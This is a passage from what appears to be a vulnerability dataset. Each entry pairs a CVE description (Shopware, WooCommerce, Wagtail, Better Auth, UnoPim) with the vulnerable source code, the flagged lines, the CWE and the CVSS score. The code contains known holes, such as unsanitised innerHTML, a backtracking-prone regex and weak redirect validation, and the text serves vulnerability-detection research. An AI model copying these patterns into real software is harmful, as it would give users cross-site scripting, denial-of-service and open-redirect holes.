        {
          "line_no": 50,
          "content": "            htmlsu += \"<rb>&nbsp;</rb>\""
        },
        {
          "line_no": 53,
          "content": "            htmlsu += \"<rt>{}</rt>\".format(tiauhu)"
        },
        {
          "line_no": 55,
          "content": "            htmlsu += \"<rt></rt>\""
        },
        {
          "line_no": 57,
          "content": "        htmlsu += _sng_ji_html(ji)"
        },
        {
          "line_no": 59,
          "content": "    html += \"<ruby>{}</ruby>\".format(htmlsu)"
        },
        {
          "line_no": 60,
          "content": "    return format_html(html)"
        },
        {
          "line_no": 65,
          "content": "        return \"<rb>{}</rb><rt>{}</rt>\".format(ji[1], ji[0])"
        },
        {
          "line_no": 67,
          "content": "        return \"<rb class='fail'>{}</rb><rt class='fail'>{}</rt>\".format("
        },
        {
          "line_no": 68,
          "content": "            ji[1], ji[0])"
        },
        {
          "line_no": 69,
          "content": "    return \"<rb class='fail'>&nbsp;&nbsp;</rb><rt class='fail'>{}</rt>\".format("
        },
        {
          "line_no": 70,
          "content": "        ji[0])"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 1056,
    "cve": "CVE-2024-42354",
    "description": "Shopware is an open commerce platform. The store-API works with regular entities and not expose all fields for the public API; fields need to be marked as ApiAware in the EntityDefinition. So only ApiAware fields of the EntityDefinition will be encoded to the final JSON. Prior to versions 6.6.5.1 and 6.5.8.13, the processing of the Criteria did not considered ManyToMany associations and so they were not considered properly and the protections didn't get used. This issue cannot be reproduced with the default entities by Shopware, but can be triggered with extensions. Update to Shopware 6.6.5.1 or 6.5.8.13 to receive a patch. For older versions of 6.2, 6.3,  and 6.4, corresponding security measures are also available via a plugin.",
    "vulnerability": {
      "file_level": [
        {
          "name": "Framework/Adapter/Twig/Node/FeatureCallSilentToken.php",
          "content": "<?php declare(strict_types=1);\n\nnamespace Shopware\\Core\\Framework\\Adapter\\Twig\\Node;\n\nuse Shopware\\Core\\Framework\\Log\\Package;\nuse Twig\\Compiler;\nuse Twig\\Node\\Node;\n\n#[Package('core')]\nclass FeatureCallSilentToken extends Node\n{\n    public function __construct(\n        private readonly string $flag,\n        Node $body,\n        int $line,\n        string $tag\n    ) {\n        parent::__construct(['body' => $body], [], $line, $tag);\n    }\n\n    public function compile(Compiler $compiler): void\n    {\n        $compiler\n            ->addDebugInfo($this)\n            ->raw('\\Shopware\\Core\\Framework\\Feature::callSilentIfInactive(\\'' . $this->flag . '\\', function () use(&$context) { ')\n            ->subcompile($this->getNode('body'))\n            ->raw('});');\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function compile(Compiler $compiler): void\n    {\n        $compiler\n            ->addDebugInfo($this)\n            ->raw('\\Shopware\\Core\\Framework\\Feature::callSilentIfInactive(\\'' . $this->flag . '\\', function () use(&$context) { ')\n            ->subcompile($this->getNode('body'))\n            ->raw('});');\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 25,
          "content": "            ->raw('\\Shopware\\Core\\Framework\\Feature::callSilentIfInactive(\\'' . $this->flag . '\\', function () use(&$context) { ')"
        }
      ]
    },
    "cwe": [
      "CWE-284"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 3.1
  },
  {
    "id": 843,
    "cve": "CVE-2024-37297",
    "description": "WooCommerce is an open-source e-commerce platform built on WordPress. A vulnerability introduced in WooCommerce 8.8 allows for cross-site scripting. A bad actor can manipulate a link to include malicious HTML & JavaScript content. While the content is not saved to the database, the links may be sent to victims for malicious purposes. The injected JavaScript could hijack content & data stored in the browser, including the session. The URL content is read through the `Sourcebuster.js` library and then inserted without proper sanitization to the classic checkout and registration forms. Versions 8.8.5 and 8.9.3 contain a patch for the issue. As a workaround, one may disable the Order Attribution feature.",
    "vulnerability": {
      "file_level": [
        {
          "name": "plugins/woocommerce/client/legacy/js/frontend/order-attribution.js",
          "content": "( function ( wc_order_attribution ) {\n\t'use strict';\n\t// Cache params reference for shorter reusability.\n\tconst params = wc_order_attribution.params;\n\n\t// Helper functions.\n\tconst $ = document.querySelector.bind( document );\n\tconst propertyAccessor = ( obj, path ) => path.split( '.' ).reduce( ( acc, part ) => acc && acc[ part ], obj );\n\tconst returnNull = () => null;\n\tconst stringifyFalsyInputValue = ( value ) => value === null || value === undefined ? '' : value;\n\n\t// Hardcode Checkout store key (`wc.wcBlocksData.CHECKOUT_STORE_KEY`), as we no longer have `wc-blocks-checkout` as a dependency.\n\tconst CHECKOUT_STORE_KEY = 'wc/store/checkout';\n\n\t/**\n\t * Get the order attribution data.\n\t *\n\t * Returns object full of `null`s if tracking is disabled.\n\t *\n\t * @returns {Object} Schema compatible object.\n\t */\n\tfunction getData() {\n\t\tconst accessor = params.allowTracking ? propertyAccessor : returnNull;\n\t\tconst entries = Object.entries( wc_order_attribution.fields )\n\t\t\t\t.map( ( [ key, property ] ) => [ key, accessor( sbjs.get, property ) ] );\n\t\treturn Object.fromEntries( entries );\n\t}\n\n\t/**\n\t * Update `wc_order_attribution` input elements' values.\n\t *\n\t * @param {Object} values Object containing field values.\n\t */\n\tfunction updateFormValues( values ) {\n\t\t// Update `<wc-order-attribution-inputs>` elements if any exist.\n\t\tfor( const element of document.querySelectorAll( 'wc-order-attribution-inputs' ) ) {\n\t\t\telement.values = values;\n\t\t}\n\n\t};\n\n\t/**\n\t * Update Checkout extension data.\n\t *\n\t * @param {Object} values Object containing field values.\n\t */\n\tfunction updateCheckoutBlockData( values ) {\n\t\t// Update Checkout block data if available.\n\t\tif ( window.wp && window.wp.data && window.wp.data.dispatch && window.wc && window.wc.wcBlocksData ) {\n\t\t\twindow.wp.data.dispatch( window.wc.wcBlocksData.CHECKOUT_STORE_KEY ).__internalSetExtensionData(\n\t\t\t\t'woocommerce/order-attribution',\n\t\t\t\tvalues,\n\t\t\t\ttrue\n\t\t\t);\n\t\t}\n\t}\n\n\t/**\n\t * Initialize sourcebuster & set data, or clear cookies & data.\n\t *\n\t * @param {boolean} allow Whether to allow tracking or disable it.\n\t */\n\twc_order_attribution.setOrderTracking = function( allow ) {\n\t\tparams.allowTracking = allow;\n\t\tif ( ! allow ) {\n\t\t\t// Reset cookies, and clear form data.\n\t\t\tremoveTrackingCookies();\n\t\t} else {\n\t\t\t// If not done yet, initialize sourcebuster.js which populates `sbjs.get` object.\n\t\t\tsbjs.init( {\n\t\t\t\tlifetime: Number( params.lifetime ),\n\t\t\t\tsession_length: Number( params.session ),\n\t\t\t\ttimezone_offset: '0', // utc\n\t\t\t} );\n\t\t}\n\t\tconst values = getData();\n\t\tupdateFormValues( values );\n\t\tupdateCheckoutBlockData( values );\n\t}\n\n\t/**\n\t * Remove sourcebuster.js cookies.\n\t * To be called whenever tracking is disabled or consent is revoked.\n\t */\n\tfunction removeTrackingCookies() {\n\t\tconst domain = window.location.hostname;\n\t\tconst sbCookies = [\n\t\t\t'sbjs_current',\n\t\t\t'sbjs_current_add',\n\t\t\t'sbjs_first',\n\t\t\t'sbjs_first_add',\n\t\t\t'sbjs_session',\n\t\t\t'sbjs_udata',\n\t\t\t'sbjs_migrations',\n\t\t\t'sbjs_promo'\n\t\t];\n\n\t\t// Remove cookies\n\t\tsbCookies.forEach( ( name ) => {\n\t\t\tdocument.cookie = `${name}=; path=/; max-age=-999; domain=.${domain};`;\n\t\t} );\n\t}\n\n\t// Run init.\n\twc_order_attribution.setOrderTracking( params.allowTracking );\n\n\t// Work around the lack of explicit script dependency for the checkout block.\n\t// Conditionally, wait for and use 'wp-data' & 'wc-blocks-checkout.\n\n\t// Wait for (async) block checkout initialization and set source values once loaded.\n\tfunction eventuallyInitializeCheckoutBlock() {\n\t\tif (\n\t\t\twindow.wp && window.wp.data && typeof window.wp.data.subscribe === 'function'\n\t\t) {\n\t\t\t// Update checkout block data once more if the checkout store was loaded after this script.\n\t\t\tconst unsubscribe = window.wp.data.subscribe( function () {\n\t\t\t\tunsubscribe();\n\t\t\t\tupdateCheckoutBlockData( getData() );\n\t\t\t}, CHECKOUT_STORE_KEY );\n\t\t}\n\t};\n\t// Wait for DOMContentLoaded to make sure wp.data is in place, if applicable for the page.\n\tif (document.readyState === \"loading\") {\n\t\tdocument.addEventListener(\"DOMContentLoaded\", eventuallyInitializeCheckoutBlock);\n\t} else {\n\t\teventuallyInitializeCheckoutBlock();\n\t}\n\n\t/**\n\t * Define an element to contribute order attribute values to the enclosing form.\n\t * To be used with the classic checkout.\n\t */\n\twindow.customElements.define( 'wc-order-attribution-inputs', class extends HTMLElement {\n\t\t// Our bundler version does not support private class members, so we use a convention of `_` prefix.\n\t\t// #values\n\t\t// #fieldNames\n\t\tconstructor(){\n\t\t\tsuper();\n\t\t\t// Cache fieldNames available at the construction time, to avoid malformed behavior if they change in runtime.\n\t\t\tthis._fieldNames = Object.keys( wc_order_attribution.fields );\n\t\t\t// Allow values to be lazily set before CE upgrade.\n\t\t\tif ( this.hasOwnProperty( '_values' ) ) {\n\t\t\t  let values = this.values;\n\t\t\t  // Restore the setter.\n\t\t\t  delete this.values;\n\t\t\t  this.values = values || {};\n\t\t\t}\n\t\t}\n\t\t/**\n\t\t * Stamp input elements to the element's light DOM.\n\t\t *\n\t\t * We could use `.elementInternals.setFromValue` and avoid sprouting `<input>` elements,\n\t\t * but it's not yet supported in Safari.\n\t\t */\n\t\tconnectedCallback() {\n\t\t\tlet inputs = '';\n\t\t\tfor( const fieldName of this._fieldNames ) {\n\t\t\t\tconst value = stringifyFalsyInputValue( this.values[ fieldName ] );\n\t\t\t\tinputs += `<input type=\"hidden\" name=\"${params.prefix}${fieldName}\" value=\"${value}\"/>`;\n\t\t\t}\n\t\t\tthis.innerHTML = inputs;\n\t\t}\n\n\t\t/**\n\t\t * Update form values.\n\t\t */\n\t\tset values( values ) {\n\t\t\tthis._values = values;\n\t\t\tif( this.isConnected ) {\n\t\t\t\tfor( const fieldName of this._fieldNames ) {\n\t\t\t\t\tconst input = this.querySelector( `input[name=\"${params.prefix}${fieldName}\"]` );\n\t\t\t\t\tif( input ) {\n\t\t\t\t\t\tinput.value = stringifyFalsyInputValue( this.values[ fieldName ] );\n\t\t\t\t\t} else {\n\t\t\t\t\t\tconsole.warn( `Field \"${fieldName}\" not found. Most likely, the '<wc-order-attribution-inputs>' element was manipulated.`);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tget values() {\n\t\t\treturn this._values;\n\t\t}\n\t} );\n\n\n}( window.wc_order_attribution ) );\n"
        }
      ],
      "method_level": [
        "connectedCallback() {\n\t\t\tlet inputs = '';\n\t\t\tfor( const fieldName of this._fieldNames ) {\n\t\t\t\tconst value = stringifyFalsyInputValue( this.values[ fieldName ] );\n\t\t\t\tinputs += `<input type=\"hidden\" name=\"${params.prefix}${fieldName}\" value=\"${value}\"/>`;\n\t\t\t}\n\t\t\tthis.innerHTML = inputs;\n\t\t}"
      ],
      "hunk_level": [
        {
          "line_no": 156,
          "content": "\t\t\tlet inputs = '';"
        },
        {
          "line_no": 158,
          "content": "\t\t\t\tconst value = stringifyFalsyInputValue( this.values[ fieldName ] );"
        },
        {
          "line_no": 159,
          "content": "\t\t\t\tinputs += `<input type=\"hidden\" name=\"${params.prefix}${fieldName}\" value=\"${value}\"/>`;"
        },
        {
          "line_no": 161,
          "content": "\t\t\tthis.innerHTML = inputs;"
        }
      ]
    },
    "cwe": [
      "CWE-79",
      "CWE-80"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 964,
    "cve": "CVE-2024-39317",
    "description": "Wagtail is an open source content management system built on Django. A bug in Wagtail's `parse_query_string` would result in it taking a long time to process suitably crafted inputs. When used to parse sufficiently long strings of characters without a space, `parse_query_string` would take an unexpectedly large amount of time to process, resulting in a denial of service. In an initial Wagtail installation, the vulnerability can be exploited by any Wagtail admin user. It cannot be exploited by end users. If your Wagtail site has a custom search implementation which uses `parse_query_string`, it may be exploitable by other users (e.g. unauthenticated users). Patched versions have been released as Wagtail 5.2.6, 6.0.6 and 6.1.3.\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "wagtail/search/utils.py",
          "content": "import operator\nimport re\nfrom functools import partial\n\nfrom django.apps import apps\nfrom django.db import connections\nfrom django.http import QueryDict\n\nfrom wagtail.search.index import RelatedFields, SearchField\n\nfrom .query import MATCH_NONE, Phrase, PlainText\n\nNOT_SET = object()\n\n\ndef balanced_reduce(operator, seq, initializer=NOT_SET):\n    \"\"\"\n    Has the same result as Python's reduce function, but performs the calculations in a different order.\n\n    This is important when the operator is constructing data structures such as search query classes.\n    This method will make the resulting data structures flatter, so operations that need to traverse\n    them don't end up crashing with recursion errors.\n\n    For example:\n\n    Python's builtin reduce() function will do the following calculation:\n\n    reduce(add, [1, 2, 3, 4, 5, 6, 7, 8])\n    (1 + (2 + (3 + (4 + (5 + (6 + (7 + 8)))))))\n\n    When using this with query classes, it would create a large data structure with a depth of 7\n    Whereas balanced_reduce will execute this like so:\n\n    balanced_reduce(add, [1, 2, 3, 4, 5, 6, 7, 8])\n    ((1 + 2) + (3 + 4)) + ((5 + 6) + (7 + 8))\n\n    Which only has a depth of 2\n    \"\"\"\n    # Casting all iterables to list makes the implementation simpler\n    if not isinstance(seq, list):\n        seq = list(seq)\n\n    # Note, it needs to be possible to use None as an initial value\n    if initializer is not NOT_SET:\n        if len(seq) == 0:\n            return initializer\n        else:\n            return operator(initializer, balanced_reduce(operator, seq))\n\n    if len(seq) == 0:\n        raise TypeError(\"reduce() of empty sequence with no initial value\")\n    elif len(seq) == 1:\n        return seq[0]\n    else:\n        break_point = len(seq) // 2\n        first_set = balanced_reduce(operator, seq[:break_point])\n        second_set = balanced_reduce(operator, seq[break_point:])\n        return operator(first_set, second_set)\n\n\n# Reduce any iterable to a single value using a logical OR e.g. (a | b | ...)\nOR = partial(balanced_reduce, operator.or_)\n# Reduce any iterable to a single value using a logical AND e.g. (a & b & ...)\nAND = partial(balanced_reduce, operator.and_)\n# Reduce any iterable to a single value using an addition\nADD = partial(balanced_reduce, operator.add)\n# Reduce any iterable to a single value using a multiplication\nMUL = partial(balanced_reduce, operator.mul)\n\nMAX_QUERY_STRING_LENGTH = 255\n\n\ndef normalise_query_string(query_string):\n    # Truncate query string\n    query_string = query_string[:MAX_QUERY_STRING_LENGTH]\n    # Convert query_string to lowercase\n    query_string = query_string.lower()\n\n    # Remove leading, trailing and multiple spaces\n    query_string = re.sub(\" +\", \" \", query_string).strip()\n\n    return query_string\n\n\ndef separate_filters_from_query(query_string):\n    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'\n\n    filters = QueryDict(mutable=True)\n    for match_object in re.finditer(filters_regexp, query_string):\n        key, value = match_object.groups()\n        filters.update(\n            {\n                key: value.strip('\"')\n                if value.strip('\"') is not value\n                else value.strip(\"'\")\n            }\n        )\n\n    query_string = re.sub(filters_regexp, \"\", query_string).strip()\n\n    return filters, query_string\n\n\ndef parse_query_string(query_string, operator=None, zero_terms=MATCH_NONE):\n    \"\"\"\n    This takes a query string typed in by a user and extracts the following:\n\n     - Quoted terms (for phrase search)\n     - Filters\n\n    For example, the following query:\n\n      `hello \"this is a phrase\" live:true` would be parsed into:\n\n    filters: {'live': 'true'}\n    tokens: And([PlainText('hello'), Phrase('this is a phrase')])\n    \"\"\"\n    filters, query_string = separate_filters_from_query(query_string)\n\n    is_phrase = False\n    tokens = []\n    if '\"' in query_string:\n        parts = query_string.split('\"')\n    else:\n        parts = query_string.split(\"'\")\n\n    for part in parts:\n        part = part.strip()\n\n        if part:\n            if is_phrase:\n                tokens.append(Phrase(part))\n            else:\n                tokens.append(\n                    PlainText(part, operator=operator or PlainText.DEFAULT_OPERATOR)\n                )\n\n        is_phrase = not is_phrase\n\n    if tokens:\n        if operator == \"or\":\n            search_query = OR(tokens)\n        else:\n            search_query = AND(tokens)\n    else:\n        search_query = zero_terms\n\n    return filters, search_query\n\n\ndef get_descendant_models(model):\n    \"\"\"\n    Returns all descendants of a model, including the model itself.\n    \"\"\"\n    descendant_models = {\n        other_model\n        for other_model in apps.get_models()\n        if issubclass(other_model, model)\n    }\n    descendant_models.add(model)\n    return descendant_models\n\n\ndef get_content_type_pk(model):\n    # We import it locally because this file is loaded before apps are ready.\n    from django.contrib.contenttypes.models import ContentType\n\n    return ContentType.objects.get_for_model(model).pk\n\n\ndef get_ancestors_content_types_pks(model):\n    \"\"\"\n    Returns content types ids for the ancestors of this model, excluding it.\n    \"\"\"\n    from django.contrib.contenttypes.models import ContentType\n\n    return [\n        ct.pk\n        for ct in ContentType.objects.get_for_models(\n            *model._meta.get_parent_list()\n        ).values()\n    ]\n\n\ndef get_descendants_content_types_pks(model):\n    \"\"\"\n    Returns content types ids for the descendants of this model, including it.\n    \"\"\"\n    from django.contrib.contenttypes.models import ContentType\n\n    return [\n        ct.pk\n        for ct in ContentType.objects.get_for_models(\n            *get_descendant_models(model)\n        ).values()\n    ]\n\n\ndef get_search_fields(search_fields):\n    for search_field in search_fields:\n        if isinstance(search_field, SearchField):\n            yield search_field\n        elif isinstance(search_field, RelatedFields):\n            yield from get_search_fields(search_field.fields)\n\n\ndef get_postgresql_connections():\n    return [\n        connection\n        for connection in connections.all()\n        if connection.vendor == \"postgresql\"\n    ]\n"
        }
      ],
      "method_level": [
        "def separate_filters_from_query(query_string):\n    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'\n\n    filters = QueryDict(mutable=True)\n    for match_object in re.finditer(filters_regexp, query_string):\n        key, value = match_object.groups()\n        filters.update(\n            {\n                key: value.strip('\"')\n                if value.strip('\"') is not value\n                else value.strip(\"'\")\n            }\n        )\n\n    query_string = re.sub(filters_regexp, \"\", query_string).strip()\n\n    return filters, query_string"
      ],
      "hunk_level": [
        {
          "line_no": 86,
          "content": "    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'"
        },
        {
          "line_no": 89,
          "content": "    for match_object in re.finditer(filters_regexp, query_string):"
        },
        {
          "line_no": 91,
          "content": "        filters.update("
        },
        {
          "line_no": 92,
          "content": "            {"
        },
        {
          "line_no": 93,
          "content": "                key: value.strip('\"')"
        },
        {
          "line_no": 94,
          "content": "                if value.strip('\"') is not value"
        },
        {
          "line_no": 95,
          "content": "                else value.strip(\"'\")"
        },
        {
          "line_no": 96,
          "content": "            }"
        },
        {
          "line_no": 97,
          "content": "        )"
        },
        {
          "line_no": 99,
          "content": "    query_string = re.sub(filters_regexp, \"\", query_string).strip()"
        }
      ]
    },
    "cwe": [
      "CWE-1333"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 44,
    "cve": "CVE-2025-27143",
    "description": "Better Auth is an authentication and authorization library for TypeScript. Prior to version 1.1.21, the application is vulnerable to an open redirect due to improper validation of the callbackURL parameter in the email verification endpoint and any other endpoint that accepts callback url. While the server blocks fully qualified URLs, it incorrectly allows scheme-less URLs. This results in the browser interpreting the URL as a fully qualified URL, leading to unintended redirection. An attacker can exploit this flaw by crafting a malicious verification link and tricking users into clicking it. Upon successful email verification, the user will be automatically redirected to the attacker's website, which can be used for phishing, malware distribution, or stealing sensitive authentication tokens. This CVE is a bypass of the fix for GHSA-8jhw-6pjj-8723/CVE-2024-56734. Version 1.1.21 contains an updated patch.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/better-auth/src/api/middlewares/origin-check.ts",
          "content": "import { APIError } from \"better-call\";\nimport { createAuthMiddleware } from \"../call\";\nimport { wildcardMatch } from \"../../utils/wildcard\";\nimport { getHost, getOrigin, getProtocol } from \"../../utils/url\";\nimport type { GenericEndpointContext } from \"../../types\";\n\n/**\n * A middleware to validate callbackURL and origin against\n * trustedOrigins.\n */\nexport const originCheckMiddleware = createAuthMiddleware(async (ctx) => {\n\tif (ctx.request?.method !== \"POST\" || !ctx.request) {\n\t\treturn;\n\t}\n\tconst { body, query, context } = ctx;\n\tconst originHeader =\n\t\tctx.headers?.get(\"origin\") || ctx.headers?.get(\"referer\") || \"\";\n\tconst callbackURL = body?.callbackURL || query?.callbackURL;\n\tconst redirectURL = body?.redirectTo;\n\tconst errorCallbackURL = body?.errorCallbackURL;\n\tconst newUserCallbackURL = body?.newUserCallbackURL;\n\tconst trustedOrigins: string[] = Array.isArray(context.options.trustedOrigins)\n\t\t? context.trustedOrigins\n\t\t: [\n\t\t\t\t...context.trustedOrigins,\n\t\t\t\t...(context.options.trustedOrigins?.(ctx.request) || []),\n\t\t\t];\n\tconst usesCookies = ctx.headers?.has(\"cookie\");\n\n\tconst matchesPattern = (url: string, pattern: string): boolean => {\n\t\tif (url.startsWith(\"/\")) {\n\t\t\treturn false;\n\t\t}\n\t\tif (pattern.includes(\"*\")) {\n\t\t\treturn wildcardMatch(pattern)(getHost(url));\n\t\t}\n\n\t\tconst protocol = getProtocol(url);\n\t\treturn protocol === \"http:\" || protocol === \"https:\" || !protocol\n\t\t\t? pattern === getOrigin(url)\n\t\t\t: url.startsWith(pattern);\n\t};\n\tconst validateURL = (url: string | undefined, label: string) => {\n\t\tif (!url) {\n\t\t\treturn;\n\t\t}\n\t\tconst isTrustedOrigin = trustedOrigins.some(\n\t\t\t(origin) =>\n\t\t\t\tmatchesPattern(url, origin) ||\n\t\t\t\t(url?.startsWith(\"/\") &&\n\t\t\t\t\tlabel !== \"origin\" &&\n\t\t\t\t\t!url.includes(\":\") &&\n\t\t\t\t\t!url.includes(\"//\")),\n\t\t);\n\t\tif (!isTrustedOrigin) {\n\t\t\tctx.context.logger.error(`Invalid ${label}: ${url}`);\n\t\t\tctx.context.logger.info(\n\t\t\t\t`If it's a valid URL, please add ${url} to trustedOrigins in your auth config\\n`,\n\t\t\t\t`Current list of trustedOrigins: ${trustedOrigins}`,\n\t\t\t);\n\t\t\tthrow new APIError(\"FORBIDDEN\", { message: `Invalid ${label}` });\n\t\t}\n\t};\n\tif (usesCookies && !ctx.context.options.advanced?.disableCSRFCheck) {\n\t\tvalidateURL(originHeader, \"origin\");\n\t}\n\tcallbackURL && validateURL(callbackURL, \"callbackURL\");\n\tredirectURL && validateURL(redirectURL, \"redirectURL\");\n\terrorCallbackURL && validateURL(errorCallbackURL, \"errorCallbackURL\");\n\tnewUserCallbackURL && validateURL(newUserCallbackURL, \"newUserCallbackURL\");\n});\n\nexport const originCheck = (\n\tgetValue: (ctx: GenericEndpointContext) => string,\n) =>\n\tcreateAuthMiddleware(async (ctx) => {\n\t\tif (!ctx.request) {\n\t\t\treturn;\n\t\t}\n\t\tconst { context } = ctx;\n\t\tconst callbackURL = getValue(ctx);\n\t\tconst trustedOrigins: string[] = Array.isArray(\n\t\t\tcontext.options.trustedOrigins,\n\t\t)\n\t\t\t? context.trustedOrigins\n\t\t\t: [\n\t\t\t\t\t...context.trustedOrigins,\n\t\t\t\t\t...(context.options.trustedOrigins?.(ctx.request) || []),\n\t\t\t\t];\n\n\t\tconst matchesPattern = (url: string, pattern: string): boolean => {\n\t\t\tif (url.startsWith(\"/\")) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tif (pattern.includes(\"*\")) {\n\t\t\t\treturn wildcardMatch(pattern)(getHost(url));\n\t\t\t}\n\t\t\treturn url.startsWith(pattern);\n\t\t};\n\n\t\tconst validateURL = (url: string | undefined, label: string) => {\n\t\t\tif (!url) {\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tconst isTrustedOrigin = trustedOrigins.some(\n\t\t\t\t(origin) =>\n\t\t\t\t\tmatchesPattern(url, origin) ||\n\t\t\t\t\t(url?.startsWith(\"/\") &&\n\t\t\t\t\t\tlabel !== \"origin\" &&\n\t\t\t\t\t\t!url.includes(\":\") &&\n\t\t\t\t\t\t!url.includes(\"//\")),\n\t\t\t);\n\t\t\tif (!isTrustedOrigin) {\n\t\t\t\tctx.context.logger.error(`Invalid ${label}: ${url}`);\n\t\t\t\tctx.context.logger.info(\n\t\t\t\t\t`If it's a valid URL, please add ${url} to trustedOrigins in your auth config\\n`,\n\t\t\t\t\t`Current list of trustedOrigins: ${trustedOrigins}`,\n\t\t\t\t);\n\t\t\t\tthrow new APIError(\"FORBIDDEN\", { message: `Invalid ${label}` });\n\t\t\t}\n\t\t};\n\t\tcallbackURL && validateURL(callbackURL, \"callbackURL\");\n\t});\n"
        }
      ],
      "method_level": [
        "validateURL",
        "originCheck",
        "validateURL"
      ],
      "hunk_level": [
        {
          "line_no": 52,
          "content": "\t\t\t\t\t!url.includes(\":\") &&"
        },
        {
          "line_no": 53,
          "content": "\t\t\t\t\t!url.includes(\"//\")),"
        },
        {
          "line_no": 110,
          "content": "\t\t\t\t\t\t!url.includes(\":\") &&"
        },
        {
          "line_no": 111,
          "content": "\t\t\t\t\t\t!url.includes(\"//\")),"
        },
        {
          "line_no": 110,
          "content": "\t\t\t\t\t\t!url.includes(\":\") &&"
        },
        {
          "line_no": 111,
          "content": "\t\t\t\t\t\t!url.includes(\"//\")),"
        }
      ]
    },
    "cwe": [
      "CWE-601"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.9,
    "cvss_version": 4.0
  },
  {
    "id": 1286,
    "cve": "CVE-2024-52305",
    "description": "UnoPim is an open-source Product Information Management (PIM) system built on the Laravel framework. A vulnerability exists in the Create User process, allowing the creation of a new admin account with an option to upload a profile image. An attacker can upload a malicious SVG file containing an embedded script. When the profile image is accessed, the embedded script executes, leading to the potential theft of session cookies. This vulnerability is fixed in 0.1.5.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/Webkul/Installer/src/Console/Commands/DefaultUser.php",
          "content": "<?php\n\nnamespace Webkul\\Installer\\Console\\Commands;\n\nuse Illuminate\\Console\\Command;\nuse Illuminate\\Support\\Facades\\DB;\nuse Illuminate\\Support\\Str;\n\nuse function Laravel\\Prompts\\select;\nuse function Laravel\\Prompts\\text;\n\nclass DefaultUser extends Command\n{\n    /**\n     * The name and signature of the console command.\n     *\n     * @var string\n     */\n    protected $signature = 'unopim:user:create\n        {--name= : The name of the user}\n        {--email= : The email address of the user}\n        {--password= : The password for the user}\n        {--ui_locale= : The UI locale (e.g., en_US) of the user}\n        {--timezone= : The timezone of the user}\n        {--admin : Specify if the user is an admin}';\n\n    /**\n     * The console command description.\n     *\n     * @var string\n     */\n    protected $description = 'This command allows you to create a new user with a name, email, password, UI locale, timezone, and optionally specify whether the user is an admin.';\n\n    /**\n     * Locales list.\n     *\n     * @var array\n     */\n    protected $locales = [\n        'ar_AE' => 'Arabic',\n        'de_DE' => 'German',\n        'en_US' => 'English',\n        'es_ES' => 'Spanish',\n        'fr_FR' => 'French',\n        'hi_IN' => 'Hindi',\n        'ja_JP' => 'Japanese',\n        'nl_NL' => 'Dutch',\n        'ru_RU' => 'Russian',\n        'zh_CN' => 'Chinese',\n    ];\n\n    /**\n     * Create UnoPim user.\n     */\n    public function handle()\n    {\n        $userName = $this->option('name') ?: text(\n            label: 'Set the Name for User',\n            default: 'Admin',\n            required: true\n        );\n\n        $userEmail = $this->option('email');\n\n        if (! $userEmail || ! filter_var($userEmail, FILTER_VALIDATE_EMAIL)) {\n            $userEmail = text(\n                label: 'Provide Email of User',\n                default: 'admin@example.com',\n                validate: fn (string $value) => match (true) {\n                    ! filter_var($value, FILTER_VALIDATE_EMAIL) => 'The provided email is invalid, kindly enter a valid email address.',\n                    default                                     => null\n                }\n            );\n        }\n\n        $userPassword = $this->option('password') ?: text(\n            label: 'Input a Secure Password for User',\n            default: 'admin@123',\n            required: true\n        );\n\n        while (strlen($userPassword) < 6) {\n            $this->error('Password must be at least 6 characters.');\n\n            $userPassword = text(\n                label: 'Input a Secure Password for User',\n                default: 'admin@123',\n                required: true\n            );\n        }\n\n        $password = password_hash($userPassword, PASSWORD_BCRYPT, ['cost' => 10]);\n\n        $timezone = $this->option('timezone') ?? date_default_timezone_get();\n\n        $this->info('Your Default Timezone is '.$timezone);\n\n        $defaultLocale = $this->option('ui_locale') ?: $this->askForDefaultLocale(\n            'APP_LOCALE',\n            'Please select the default application locale',\n            $this->locales\n        );\n\n        $isAdmin = $this->option('admin');\n        $localeId = DB::table('locales')->where('code', $defaultLocale)->where('status', 1)->first()?->id ?? 58;\n        $role = $isAdmin ? DB::table('roles')->where('permission_type', 'all')->first()?->id : DB::table('roles')->where('permission_type', 'custom')->first()?->id;\n\n        if (! $role) {\n            DB::table('roles')->updateOrInsert(\n                [\n                    'name'            => $isAdmin ? 'Admin' : 'User',\n                    'description'     => $isAdmin ? 'This role users will have all the access' : 'This role users have limited access',\n                    'permission_type' => $isAdmin ? 'all' : 'custom',\n                    'permissions'     => ! $isAdmin ? json_encode(['dashboard']) : null,\n                ]\n            );\n        }\n\n        $role = $isAdmin ? DB::table('roles')->where('permission_type', 'all')->first()?->id : DB::table('roles')->where('permission_type', 'custom')->first()?->id;\n\n        try {\n            DB::table('admins')->updateOrInsert(\n                [\n                    'api_token'    => Str::random(80),\n                    'created_at'   => date('Y-m-d H:i:s'),\n                    'name'         => $userName,\n                    'email'        => $userEmail,\n                    'password'     => $password,\n                    'role_id'      => $role,\n                    'status'       => 1,\n                    'timezone'     => $timezone,\n                    'ui_locale_id' => $localeId,\n                    'updated_at'   => date('Y-m-d H:i:s'),\n                ]\n            );\n\n            $this->info('-----------------------------');\n            $this->info('Congratulations! The User has been created successfully.');\n            $this->info('Please navigate to: '.env('APP_URL').'/admin'.' and use the following credentials for authentication:');\n            $this->info('Email: '.$userEmail);\n            $this->info('Password: '.$userPassword);\n            $this->info('Cheers!');\n        } catch (\\Exception $e) {\n            if (strpos($e->getMessage(), 'Duplicate entry')) {\n                $this->error('User with email '.$userEmail.' already exists.');\n            } else {\n                